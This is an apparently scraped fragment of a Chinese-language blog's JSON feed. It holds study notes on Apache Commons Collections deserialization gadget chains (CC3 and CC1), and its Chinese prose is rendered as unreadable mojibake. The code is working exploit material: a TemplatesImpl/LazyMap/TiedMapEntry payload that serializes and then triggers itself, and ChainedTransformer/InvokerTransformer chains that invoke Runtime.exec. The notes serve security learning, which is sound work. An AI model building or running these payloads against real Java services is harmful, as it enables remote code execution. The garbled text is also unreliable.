Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl ctf = new TemplatesImpl(); setFieldValue(ctf,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(ctf,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(ctf, \u0026#34;_class\u0026#34;, null); setFieldValue(ctf, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer(1)}; Transformer[] chainPart = new Transformer[]{new ConstantTransformer(TrAXFilter.class),new InstantiateTransformer(new Class[]{Templates.class},new Object[]{ctf})}; Transformer chain = new ChainedTransformer(fakeTransformer); Map hashMap = new HashMap(); Map lazy = LazyMap.decorate(hashMap,chain); TiedMapEntry outerMap = new TiedMapEntry(lazy,\u0026#34;fupanc\u0026#34;); HashSet o = new HashSet(); o.add(outerMap); hashMap.remove(\u0026#34;fupanc\u0026#34;); Field field1 = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); field1.setAccessible(true); field1.set(chain,chainPart); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(o); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } å¥½å¤„ é¦–å…ˆå°±æ˜¯åœ¨åˆ©ç”¨POCçš„æ—¶å€™ä¸€å®šè¦æ³¨æ„javaç‰ˆæœ¬çš„é—®é¢˜ï¼Œç»“åˆCC6çš„åŸºæœ¬åœ¨java7å’Œjava8éƒ½é€šæ€ã€‚\nå¯¹äºä½¿ç”¨InstantiateTransformerç±»ï¼Œå½“ä¸å…è®¸ä½¿ç”¨InvokerTransformerç±»çš„æ—¶å€™å°±å¯ä»¥ä½¿ç”¨è¿™ä¸ªã€‚\n","date":"2024-07-17T22:53:06+08:00","permalink":"https://fupanc-w1n.github.io/p/cc3/","title":"CC3"},{"content":"CC1 å‰é¢è¯´è¿‡äº†URLDNSè¿™æ¡é“¾ï¼Œç°åœ¨æˆ‘ä»¬å°±å¯ä»¥å¼€å§‹å­¦ä¹ Common-Collectionsåˆ©ç”¨é“¾ï¼Œè¿™æ˜¯ååºåˆ—åŒ–å­¦ä¹ ä¸­ä¸å¯é€ƒè¿‡çš„ä¸€å…³ã€‚\nå°çš„çŸ¥è¯†ç‚¹ æ¥è¡¥å……ä¸€ä¸‹ä¹‹å‰ä¸€ç›´é‡åˆ°çš„ä¸€ä¸ªçŸ¥è¯†ç‚¹ï¼ŒJAVAåŸºç¡€ï¼Œä¸€ç›´åœ¨å¿˜è®°ï¼Œå°±æ˜¯æ•°ç»„é—®é¢˜ï¼Œè¿™é‡Œç®€å•è®°å½•ä¸€ä¸‹æ•°ç»„çš„åˆå§‹åŒ–é—®é¢˜ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 //ç¬¬ä¸€ç§ ä½¿ç”¨æ•°ç»„æ¥è¡¨ç¤ºâ€œä¸€ç»„â€intç±»å‹,ç„¶åå†åˆ†å¼€èµ‹å€¼å³å¯ int[] ns = new int[5]; ns[0] = 68; ns[1] = 66; ... å¯ä»¥ä½¿ç”¨ æ•°ç»„å˜é‡.length è·å–æ•°ç»„å¤§å° //ç¬¬äºŒç§ å®šä¹‰æ•°ç»„æ—¶ç›´æ¥æŒ‡å®šåˆå§‹åŒ–çš„å…ƒç´ ï¼Œè¿™æ ·å°±ä¸å¿…å†™å‡ºæ•°ç»„å¤§å°ï¼Œè€Œæ˜¯ç”±ç¼–è¯‘å™¨è‡ªåŠ¨æ¨ç®—æ•°ç»„å¤§å°ã€‚ int[] ns = new int[]{12,23,24,45,45}; //ç¬¬ä¸‰ç§ è¿˜å¯ä»¥åœ¨ç¬¬äºŒæ­¥åŸºç¡€ä¸Šè¿›ä¸€æ­¥ç®€å†™ int[] ns = {11,22,33,44,55}; //ç¬¬å››ç§ è¿™é‡Œå†ç®€å•è®²è®²å­—ç¬¦ä¸²æ•°ç»„ String[] names = {\u0026#34;haha\u0026#34;,\u0026#34;quke\u0026#34;,\u0026#34;erqieha\u0026#34;}; æš‚æ—¶éœ€è¦æ³¨æ„çš„å°±æ˜¯è¿™å››ä¸ªï¼Œç°åœ¨å°±æ­£å¼å¼€å§‹å­¦ä¹ CCé“¾ã€‚\nCommons Collections å‰ç½®è¯´æ˜ Apache Commonsæ˜¯Apacheè½¯ä»¶åŸºé‡‘ä¼šçš„é¡¹ç›®ï¼Œæ›¾ç»éš¶å±äºJakartaé¡¹ç›®ã€‚Commonsçš„ç›®çš„æ˜¯æä¾›å¯é‡ç”¨çš„ã€è§£å†³å„ç§å®é™…çš„é€šç”¨é—®é¢˜ä¸”å¼€æºçš„Javaä»£ç ã€‚Commonsç”±ä¸‰éƒ¨åˆ†ç»„æˆï¼šProperï¼ˆæ˜¯ä¸€äº›å·²å‘å¸ƒçš„é¡¹ç›®ï¼‰ã€Sandboxï¼ˆæ˜¯ä¸€äº›æ­£åœ¨å¼€å‘çš„é¡¹ç›®ï¼‰å’ŒDormantï¼ˆæ˜¯ä¸€äº›åˆšå¯åŠ¨æˆ–è€…å·²ç»åœæ­¢ç»´æŠ¤çš„é¡¹ç›®ï¼‰ã€‚\nCommons CollectionsåŒ…ä¸ºJavaæ ‡å‡†çš„Collections APIæä¾›äº†ç›¸å½“å¥½çš„è¡¥å……ã€‚åœ¨æ­¤åŸºç¡€ä¸Šå¯¹å…¶å¸¸ç”¨çš„æ•°æ®ç»“æ„æ“ä½œè¿›è¡Œäº†å¾ˆå¥½çš„å°è£…ã€æŠ½è±¡å’Œè¡¥å……ã€‚è®©æˆ‘ä»¬åœ¨å¼€å‘åº”ç”¨ç¨‹åºçš„è¿‡ç¨‹ä¸­ï¼Œæ—¢ä¿è¯äº†æ€§èƒ½ï¼ŒåŒæ—¶ä¹Ÿèƒ½å¤§å¤§ç®€åŒ–ä»£ç ã€‚\nç”±äºå¤§é‡çš„ç”Ÿäº§ç¯å¢ƒä¸­éƒ½ä¼šå¯¼å…¥è¿™ä¸ªåŒ…ï¼Œæ‰€ä»¥æ­¤åŒ…ä¸­çš„ä¼—å¤šååºåˆ—åŒ–é“¾å·²ç»æˆä¸ºç»å…¸é“¾æ¡ã€‚\nå­¦ä¹ è·¯çº¿ï¼šCC1 -\u0026gt; CC6 -\u0026gt; CC3 -\u0026gt; CC5 -\u0026gt; CC7 -\u0026gt; CC2 -\u0026gt; CC4 (å…¶ä¸­CC2å’ŒCC4æ˜¯common-collections4çš„åˆ©ç”¨é“¾)\nç¯å¢ƒæ­å»º Apache Commonsé¡¹ç›®éœ€è¦å¯¼å…¥ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨è¿™é‡Œéœ€è¦æ­å»ºç¯å¢ƒï¼Œè¿˜æ˜¯ä½¿ç”¨mavenæ¥å¯¼åŒ…ï¼Œä¿®æ”¹pom.xmlå³å¯ï¼Œæ¯”å¦‚æˆ‘è¿™é‡Œè¦å¯¼ä¸€ä¸ªcc3.2.1ï¼ŒåŠ ä¸Šå¦‚ä¸‹ï¼š\n1 2 3 4 5 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;commons-collections\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;commons-collections\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.2.1\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; å†æ›´æ–°ä¸€ä¸‹é¡¹ç›®å³å¯ã€‚\nä¸‹è½½å¹¶ä¸”é…ç½®ç›¸åº”æºç  å› ä¸ºJDKè‡ªå¸¦Â·çš„åŒ…é‡Œé¢æœ‰äº›æ–‡ä»¶æ˜¯åç¼–è¯‘çš„.classæ–‡ä»¶å¯¼è‡´æˆ‘ä»¬æ²¡æ³•æ¸…æ¥šçœ‹æ‡‚ä»£ç ï¼Œä¸ºäº†æ–¹ä¾¿è°ƒè¯•ï¼Œæˆ‘ä»¬éœ€è¦å°†å®ƒä»¬è½¬å˜ä¸º.javaæ–‡ä»¶ï¼Œè¿™å°±éœ€è¦æˆ‘ä»¬å®‰è£…å“åº”çš„æºç ã€‚\nä¸‹è½½åœ°å€ï¼šhttps://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4\nå…ˆåŸæœ¬jdkç›®å½•ä¸‹çš„src.zipè§£å‹åˆ°å½“å‰ç›®å½•ï¼Œåœ¨é“¾æ¥ä¸­ç‚¹å‡»zipä¸‹è½½åè§£å‹ï¼Œåœ¨/src/share/classesä¸­æ‰¾åˆ°sunæ–‡ä»¶ï¼ŒæŠŠå…¶å¤åˆ¶åˆ°åŸæœ¬jdkä¸­src.zipçš„è§£å‹æ–‡ä»¶ã€‚\næœ€åå†åœ¨ideaä¸­æŠŠsrcæ–‡ä»¶å¤¹æ·»åŠ åˆ°åŸè·¯å¾„ä¸‹å³å¯ï¼š\nåŠ¨æ€ä»£ç† ä¸»è¦å†…å®¹å°±å›å»çœ‹åŠ¨æ€ä»£ç†ç¬”è®°çš„å†…å®¹ï¼Œä¸»è¦å°±æ˜¯ä¸€ä¸ªç‚¹ï¼šå½“æˆ‘ä»¬è°ƒç”¨æŸä¸ªåŠ¨æ€ä»£ç†å¯¹è±¡çš„æ–¹æ³•æ—¶ï¼Œéƒ½ä¼šè§¦å‘ä»£ç†ç±»çš„Invokeæ–¹æ³•ï¼Œå¹¶ä¼ é€’å¯¹åº”çš„å†…å®¹ã€‚\næ­£å¼åˆ†æ æµ‹è¯•ç¯å¢ƒï¼š\nJDK 8u65 commons-collections 3.2.1 éœ€è¦äº†è§£çš„ç±»å’Œæ¥å£ AbstractMapDecorator åœ¨CCåº“ä¸­æä¾›äº†ä¸€ä¸ªæŠ½è±¡ç±»org.apache.commons.collections.map.AbstractMapDecoratorï¼Œè¿™ä¸ªç±»æ˜¯Mapçš„æ‰©å±•ï¼Œä»åå­—æ¥çœ‹ï¼Œè¿™æ˜¯ä¸€ä¸ªåŸºç¡€çš„è£…é¥°å™¨ï¼Œç”¨æ¥ç»™mapæä¾›é™„åŠ åŠŸèƒ½ï¼Œè¢«è£…é¥°çš„mapå­˜åœ¨è¯¥ç±»çš„å±æ€§ä¸­ï¼Œå¹¶ä¸”å°†æ‰€æœ‰çš„æ“ä½œéƒ½è½¬å‘ç»™è¿™ä¸ªmapã€‚\nè¿™ä¸ªç±»æœ‰å¾ˆå¤šå®ç°ç±»ï¼Œå„ä¸ªç±»è§¦å‘çš„æ–¹å¼ä¸åŒï¼Œé‡ç‚¹å…³æ³¨çš„æ˜¯TransformedMap ä»¥åŠLazyMapã€‚\nTransformedMap org.apache.commons.collections.map.TransformedMapç±»å¯ä»¥åœ¨ä¸€ä¸ªå…ƒç´ è¢«åŠ å…¥åˆ°é›†åˆå†…æ—¶ï¼Œè‡ªåŠ¨å¯¹è¯¥å…ƒç´ è¿›è¡Œç‰¹å®šçš„ä¿®é¥°å˜æ¢ï¼Œå…·ä½“çš„å˜æ¢é€»è¾‘ç”±Transformeræ¥å®šä¹‰ï¼ŒTransformer åœ¨ TransformedMap å®ä¾‹åŒ–æ—¶ä½œä¸ºå‚æ•°ä¼ å…¥ã€‚å¯ä»¥ç®€å•çœ‹çœ‹è¿™ä¸ªç±»çš„å®šä¹‰ï¼š\nè¿™ä¸ªç±»ç»§æ‰¿äº†ä¸€ä¸ªç±»å’Œå®ç°äº†ä¸€ä¸ªæ¥å£ã€‚å†çœ‹æºç å…¶å®å¯ä»¥å‘ç°å¾ˆå¤šæ–¹æ³•éƒ½å®ç°äº†transform()æ–¹æ³•\nè¿™é‡Œç»™ä¸€ä¸ªç¤ºä¾‹åˆ©ç”¨ä»£ç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 package org.example; import org.apache.commons.collections.map.TransformedMap; import org.apache.commons.collections.Transformer; import java.util.HashMap; import java.util.Map; public class Test { public static Transformer keyTransformer = new Transformer() { public Object transform(Object input) { int num = (int) input; num += 1; return (Object) num; } }; public static Transformer valueTransformer = new Transformer() { public Object transform(Object input) { String str = input.toString(); return str + \u0026#34;1\u0026#34;; } }; public static void main(String[] args) { HashMap\u0026lt;Integer, String\u0026gt; hashMap = new HashMap\u0026lt;\u0026gt;(); hashMap.put(1, \u0026#34;a\u0026#34;); System.out.println(\u0026#34;åˆå§‹åŒ–map:\u0026#34; + hashMap); // åˆ›å»ºTransformedMap Map map = TransformedMap.decorate(hashMap, keyTransformer, valueTransformer); map.put(2, \u0026#34;b\u0026#34;); System.out.println(\u0026#34;transformMap:\u0026#34; + map); map.put(1, \u0026#34;w\u0026#34;); System.out.println(\u0026#34;transformMap:\u0026#34; + map); map.remove(1); System.out.println(\u0026#34;transformMap:\u0026#34; + map); } } è¿è¡Œåçš„è¾“å‡ºç»“æœï¼š\n1 2 3 4 åˆå§‹åŒ–map:{1=a} transformMap:{1=a, 3=b1} transformMap:{1=a, 2=w1, 3=b1} transformMap:{2=w1, 3=b1} å…¶å®è¿™é‡Œå‡ºç°è¿™ä¸ªç»“æœçš„åŸå› è¿˜æ˜¯å’Œå¯¹è±¡ç›¸å…³ï¼Œå¯ä»¥æ¥è°ƒè¯•ä¸€ä¸‹ï¼š\nè¿™é‡Œé¦–å…ˆäº†è§£ä¸€ä¸‹åŒ¿åç±»æ˜¯ä»€ä¹ˆï¼Œå¯ä»¥å‚è€ƒè¿™ä¸ªæ–‡ç« ï¼Œå°±æ˜¯å¯ä»¥å®ç°ä¸€ä¸ªç±»ä¸­åŒ…å«å¦å¤–ä¸€ä¸ªç±»ï¼Œä¸”ä¸éœ€è¦æä¾›ä»»ä½•çš„ç±»åç›´æ¥å®ä¾‹åŒ–ã€‚ä¸»è¦æ˜¯ç”¨äºåœ¨æˆ‘ä»¬éœ€è¦çš„æ—¶å€™åˆ›å»ºä¸€ä¸ªå¯¹è±¡æ¥æ‰§è¡Œç‰¹å®šçš„ä»»åŠ¡ï¼Œå¯ä»¥ä½¿ä»£ç æ›´åŠ ç®€æ´ã€‚\né‡è¦è¯´æ˜ï¼šé¦–å…ˆåœ¨è¿™ä¸²ä»£ç ä½¿ç”¨åŒ¿åç±»å®ç°äº†Transformeræ¥å£ï¼Œåˆ›å»ºäº†ä¸€ä¸ªå¯¹è±¡ï¼Œä»£ç éƒ½ä½¿ç”¨åŒ¿åç±»å®ç°äº†Transformeræ¥å£ï¼Œåˆ›å»ºäº†ä¸€ä¸ªä¸´æ—¶çš„ç±»å®ä¾‹ï¼ˆå³å¯¹è±¡ï¼‰ï¼Œå¹¶å°†è¿™ä¸ªç±»å®ä¾‹èµ‹å€¼ç»™äº†keyTransformerå’ŒvalueTransformerå¹¶éƒ½é‡å†™äº†transform()æ–¹æ³•ï¼Œè¿™ä¸ªæ˜¯æœ€é‡è¦çš„ã€‚ï¼ˆé‡è¦çš„æ˜¯çœ‹ä»£ç ï¼Œä¸€çœ‹å°±æ‡‚äº†ï¼‰\nç„¶åå¼€å§‹è°ƒè¯•ï¼š\né‡è¦çœ‹åé¢çš„puté‚£éƒ¨åˆ†ï¼Œç¬¬ä¸€ä¸ªå°±æ˜¯HashMapç±»çš„putæ–¹æ³•ï¼Œå°±æ˜¯æ”¾å…¥ä¸€å¯¹é”®å€¼å¯¹ï¼Œä¸å¤šè¯´ã€‚é‡ç‚¹çœ‹åé¢ã€‚\nç„¶åè°ƒç”¨\nè·Ÿè¿›æºç ï¼š\nå³è¿”å›ä¸€ä¸ªTransformedMapå¯¹è±¡ï¼Œå¹¶ä¸”æ­¤æ—¶çš„keyTransformerå’ŒvalueTransformerå¯¹åº”è‡ªå®šä¹‰çš„åŒ¿åç±»ã€‚\nç„¶ååŠ æ–­ç‚¹ï¼š\nç„¶åç°åœ¨æ¥çœ‹å¯¹åº”çš„å˜é‡çš„å€¼ï¼š\né‡ç‚¹çœ‹å€¼ï¼Œæ³¨æ„valueTransformerå’ŒkeyTransformerçš„å€¼ä¸ºTest$2..å’ŒTest$1..ï¼Œç›¸äº’å¯¹æ¯”åˆ°æ¥çœ‹ï¼Œå¯ä»¥å¾ˆå®¹æ˜“çœ‹å‡ºè¿™ç§æ ¼å¼å°±æ˜¯ä»£è¡¨åŒ¿åç±»ï¼Œè€Œä¸æ˜¯ä¸€ä¸ªTestç±»å®ä¾‹ã€‚\nåœ¨åç»­çš„map.put()ä¸­ï¼Œè°ƒç”¨çš„å°±æ˜¯TransformedMapç±»çš„putæ–¹æ³•ï¼š\nç„¶åå°±ä¼šè°ƒç”¨transformKeyæ–¹æ³•ï¼Œæºç å¦‚ä¸‹ï¼š\næ­¤æ—¶å°±ä¼šè°ƒç”¨keyTransformerçš„transformæ–¹æ³•ï¼Œæ­¤æ—¶è°ƒç”¨çš„å°±æ˜¯åŒ¿åç±»çš„transformæ–¹æ³•ï¼Œé‚£ä¹ˆå°±æ˜¯\nvalueTransformer.transformer()åŒç†ã€‚é€»è¾‘æ˜¯è¿™æ ·ï¼Œå¹¶ä¸”åœ¨è°ƒè¯•è¿‡ç¨‹ä¸­ä¹ŸåŒæ ·è¿™è¿™ä¸ªè¿‡ç¨‹ã€‚\nç»§ç»­çœ‹map.put()æ–¹æ³•ï¼š\n1 return this.getMap().put(key, value); è¿™ä¸ªgetMapå¯¹åº”TransformedMapçš„çˆ¶ç±»AbstractInputCheckedMapDecoratorçš„çˆ¶ç±»AbstractMapDecoratorçš„getMap()æ–¹æ³•ï¼Œæºç ä¸ºï¼š\n1 2 3 protected Map getMap() { return this.map; } ç»“åˆå‰é¢çš„å®ä¾‹åŒ–çš„æè¿°ï¼Œå¯ä»¥çŸ¥é“è¿™é‡Œçš„mapå³HashMapç±»å®ä¾‹ï¼Œæ‰€ä»¥è¿™é‡Œä¼šå†è°ƒç”¨HashMapçš„putæ–¹æ³•æ”¾å…¥ä¸€å¯¹ä¿®é¥°åçš„é”®å€¼å¯¹ã€‚\nåé¢é‚£ä¸ªåŒç†\næœ€åä¼šè°ƒç”¨HashMaspç±»çš„removeæ–¹æ³•æ¥å»æ‰ä¸€ä¸ªé”®å€¼å¯¹ã€‚\nä»£ç åˆ†æç»“æŸï¼Œå¯¹äºè¿™ä¸€æ®µç¤ºä¾‹ä»£ç å°±éœ€è¦ç†è§£é€å½»ï¼Œäº†è§£å…¶ä¸­çš„è¿è¡Œè¿‡ç¨‹ä¸é€»è¾‘ï¼Œåé¢ä¼šæœ‰ç”¨ã€‚\nä¹Ÿå°±æ˜¯è¯´å½“ TransformedMap å†…çš„ key æˆ–è€… value å‘ç”Ÿå˜åŒ–æ—¶ï¼ˆä¾‹å¦‚è°ƒç”¨ TransformedMap çš„ put æ–¹æ³•æ—¶ï¼‰ï¼Œå°±ä¼šè§¦å‘ç›¸åº”å‚æ•°çš„ Transformer çš„ transform() æ–¹æ³•ã€‚\nLazyMap org.apache.commons.collections.map.LazyMapä¸TransformedMapç±»ä¼¼ï¼Œè¿™ä¸ªç±»è§¦å‘transform()æ–¹æ³•çš„ç‚¹å°±åœ¨äºè°ƒç”¨get()æ–¹æ³•æ—¶ä¼ å…¥çš„keyä¸å­˜åœ¨ï¼Œçœ‹ä¸€ä¸‹get()æ–¹æ³•çš„æºç ï¼š\n1 2 3 4 5 6 7 8 9 public Object get(Object key) { if (!super.map.containsKey(key)) { Object value = this.factory.transform(key); super.map.put(key, value); return value; } else { return super.map.get(key); } } å†çœ‹ä¸‹é¢ï¼š\nå¯ä»¥çŸ¥é“LazyMapç±»ç»§æ‰¿äºAbstractMapDecoratorã€‚\norg.apache.commons.collections.map.DefaultedMapä¸LazyMapå…·æœ‰ç›¸åŒåŠŸèƒ½ï¼ŒåŒæ ·æ˜¯get()æ–¹æ³•ä¼šè§¦å‘transform æ–¹æ³•ã€‚\nTransformer org.apache.commons.collections.Transformeræ˜¯ä¸€ä¸ªæ¥å£ç±»ï¼Œæºä»£ç å¦‚ä¸‹ï¼š\n1 2 3 4 5 package org.apache.commons.collections; public interface Transformer { Object transform(Object var1); } å®ƒæä¾›äº†ä¸€ä¸ªtransform()æ–¹æ³•ï¼Œç”¨æ¥å®šä¹‰å…·ä½“çš„è½¬æ¢é€»è¾‘ã€‚\nåœ¨Commons Colection é¡¹ç›®ä¸­ï¼Œç¨‹åºæä¾›äº†21ä¸ªTransformer çš„å®ç°ç±»ï¼Œç”¨æ¥å®ç°ä¸åŒçš„å¯¹TransformedMap ä¸­çš„ key/value è¿›è¡Œä¿®æ”¹çš„åŠŸèƒ½\né‡ç‚¹å…³æ³¨å‡ ä¸ªå®ç°ç±»\nInvokerTransformer org.apache.commons.collections.functors.InvokerTransformerï¼Œè¿™ä¸ªå®ç°ç±»ä» Commons Collections 3.0 å¼•å…¥ï¼ŒåŠŸèƒ½æ˜¯ä½¿ç”¨åå°„åˆ›å»ºä¸€ä¸ªæ–°å¯¹è±¡ï¼Œæ¥çœ‹ä¸€ä¸‹å®ƒçš„transformæ–¹æ³•æºç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 public Object transform(Object input) { if (input == null) { return null; } else { try { Class cls = input.getClass(); Method method = cls.getMethod(this.iMethodName, this.iParamTypes); return method.invoke(input, this.iArgs); } catch (NoSuchMethodException var5) { throw new FunctorException(\u0026#34;InvokerTransformer: The method \u0026#39;\u0026#34; + this.iMethodName + \u0026#34;\u0026#39; on \u0026#39;\u0026#34; + input.getClass() + \u0026#34;\u0026#39; does not exist\u0026#34;); } catch (IllegalAccessException var6) { throw new FunctorException(\u0026#34;InvokerTransformer: The method \u0026#39;\u0026#34; + this.iMethodName + \u0026#34;\u0026#39; on \u0026#39;\u0026#34; + input.getClass() + \u0026#34;\u0026#39; cannot be accessed\u0026#34;); } catch (InvocationTargetException var7) { throw new FunctorException(\u0026#34;InvokerTransformer: The method \u0026#39;\u0026#34; + this.iMethodName + \u0026#34;\u0026#39; on \u0026#39;\u0026#34; + input.getClass() + \u0026#34;\u0026#39; threw an exception\u0026#34;, var7); } } } é‡ç‚¹å°±æ˜¯tryéƒ¨åˆ†ä»£ç ï¼š\n1 2 3 Class cls = input.getClass(); Method method = cls.getMethod(this.iMethodName, this.iParamTypes); return method.invoke(input, this.iArgs); è¿™é‡Œä½¿ç”¨åå°„è·å–æ–¹æ³•å¹¶ä½¿ç”¨invoke()æ–¹æ³•è°ƒç”¨è¿™ä¸ªæ–¹æ³•ï¼Œçœ‹çœ‹è¿™é‡Œéœ€è¦åˆ©ç”¨çš„å‡ ä¸ªå‚æ•°ï¼š\n1 2 3 private final String iMethodName; private final Class[] iParamTypes; private final Object[] iArgs; èµ‹å€¼æ–¹æ³•ä¹Ÿåœ¨æ„é€ å‡½æ•°é‡Œé¢ï¼Œå¦‚ä¸‹ï¼š\n1 2 3 4 5 public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) { this.iMethodName = methodName; this.iParamTypes = paramTypes; this.iArgs = args; } å°è¯•è‡ªå·±æ„é€ ï¼Œæµ‹è¯•ä»£ç ï¼š\n1 2 3 4 5 6 7 8 9 10 package org.example; import org.apache.commons.collections.functors.InvokerTransformer; import java.lang.Runtime; public class Test { public static void main(String[] args) { InvokerTransformer x = new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}); x.transform(Runtime.getRuntime()); } } æˆåŠŸå¼¹å‡ºè®¡ç®—æœºï¼š ChainedTransformer org.apache.commons.collections.functors.ChainedTransformerç±»ä¹Ÿæ˜¯Transformerçš„å®ç°ç±»ï¼Œå…³é”®æºç å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 public ChainedTransformer(Transformer[] transformers) { this.iTransformers = transformers; } public Object transform(Object object) { for(int i = 0; i \u0026lt; this.iTransformers.length; ++i) { object = this.iTransformers[i].transform(object); } return object; } è¿™é‡Œçš„é‡ç‚¹å°±æ˜¯è¿™ä¸ªç±»è‡ªå·±ç»´æŠ¤äº†ä¸€ä¸ªTransformeræ•°ç»„ï¼Œåœ¨è°ƒç”¨ChainedTransformerçš„transformæ–¹æ³•æ—¶ï¼Œä¼šå¾ªç¯æ•°ç»„ï¼Œä¾æ¬¡è°ƒç”¨ Transformer æ•°ç»„æ¯ä¸ª trandformæ–¹æ³•ï¼Œå¹¶å°†ç»“æœä¼ é€’ç»™ä¸‹ä¸€ä¸ª Transformerã€‚\nè¿™æ ·å°±ç»™äº†ä½¿ç”¨è€…é“¾å¼è°ƒç”¨å¤šä¸ª Transformer åˆ†åˆ«å¤„ç†å¯¹è±¡çš„èƒ½åŠ›ã€‚\nConstantTransformer org.apache.commons.collections.functors.ConstantTransformeræ˜¯è¿”å›ä¸€ä¸ªå›ºå®šå¸¸é‡çš„Transformerï¼Œåœ¨åˆå§‹åŒ–æ—¶å‚¨å­˜äº†ä¸€ä¸ªObjectï¼Œåç»­çš„è°ƒç”¨ä¼šç›´æ¥è¿”å›è¿™ä¸ªObjectã€‚å…³é”®æºç å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 public ConstantTransformer(Object constantToReturn) { this.iConstant = constantToReturn; } public Object transform(Object input) { return this.iConstant; } è¿™ä¸ªç±»ç”¨äºå’ŒChainedTransformeré…åˆï¼Œå°†å…¶ç»“æœä¼ å…¥InvokerTransformeræ¥è°ƒç”¨æˆ‘ä»¬æŒ‡å®šçš„ç±»çš„æŒ‡å®šæ–¹æ³•ã€‚\næ”»å‡»æ„é€  CC1è¿™é‡Œæœ‰ä¸¤æ¡é“¾å¯ä»¥åˆ©ç”¨ï¼Œåˆ†åˆ«æ˜¯åˆ©ç”¨TransformedMapç±»å’ŒLazyMapç±»ï¼Œç°åœ¨æ¥åˆ†åˆ«è¯´æ˜ä¸€ä¸‹ã€‚\nTransformedMapé“¾ åŸºæœ¬æœ¬åœ°ä»£ç  è¿™é‡Œå°±ç»“åˆåˆ°å‰é¢çŸ¥è¯†ç‚¹ï¼Œæ¥æ„é€ ååºåˆ—åŒ–çš„æ¶æ„åˆ©ç”¨ä»£ç ã€‚ç°åœ¨æˆ‘ä»¬æ„é€ çš„æœ€ç»ˆçš„åˆ©ç”¨ç‚¹ï¼Œå°±æ˜¯Runtime.getRuntime().exec(\u0026quot;calc\u0026quot;)ï¼Œåœ¨è¿™é‡Œä½¿ç”¨TransformedMap è§¦å‘ï¼Œæœ¬åœ°demoå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 package org.example; import org.apache.commons.collections.map.TransformedMap; import java.lang.Runtime; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; import java.util.HashMap; import java.util.Map; public class Test { public static void main(String[] args) { ChainedTransformer chain = new ChainedTransformer(new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{null,null}), new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}) }); HashMap hashMap = new HashMap(); Map map2 = TransformedMap.decorate(hashMap,chain,null); map2.put(10,\u0026#34;xxx\u0026#34;); } } è¯´æ˜ä¸€ä¸‹è¿™ä¸²ä»£ç çš„ä½œç”¨ï¼Œå…ˆè¯´åé¢çš„åˆ©ç”¨ä»£ç ï¼š\n1 2 3 HashMap hashMap = new HashMap(); Map map2 = TransformedMap.decorate(hashMap,chain,null); map2.put(10,\u0026#34;xxx\u0026#34;); è¿™éƒ¨åˆ†ä»£ç åªè¦ç†è§£åˆ°äº†å‰é¢åœ¨TransformedMapç±»éƒ¨åˆ†ç»™çš„ç¤ºä¾‹ä»£ç åŸºæœ¬å°±å¯ä»¥ç†è§£äº†ã€‚æ‰€ä»¥é“¾å­èµ·å§‹ç‚¹å°±æ˜¯\nç°åœ¨æ¥çœ‹æµç¨‹ï¼Œæ‰“æ–­ç‚¹å¦‚ä¸‹ï¼š\nç„¶åå°±ç»§ç»­è·Ÿè¿›ï¼Œç”±äºæˆ‘ä»¬ä¼ å…¥çš„keyTransformerå°±æ˜¯ChainedTransformerç±»å¯¹è±¡ï¼Œæ‰€ä»¥è¿™é‡Œè°ƒç”¨çš„transform()æ–¹æ³•æ—¶ï¼Œè°ƒç”¨çš„å°±æ˜¯ChainedTransformerç±»çš„transform()æ–¹æ³•ï¼Œå¦‚ä¸‹ï¼š\nç°åœ¨æ¥çœ‹æˆ‘ä»¬ç»™ChainedTransformerç±»ä¼ å…¥çš„æ•°ç»„ï¼š\n1 2 3 4 5 6 ChainedTransformer chain = new ChainedTransformer(new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{null,null}), new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}) }); //æ³¨æ„ç†è§£ 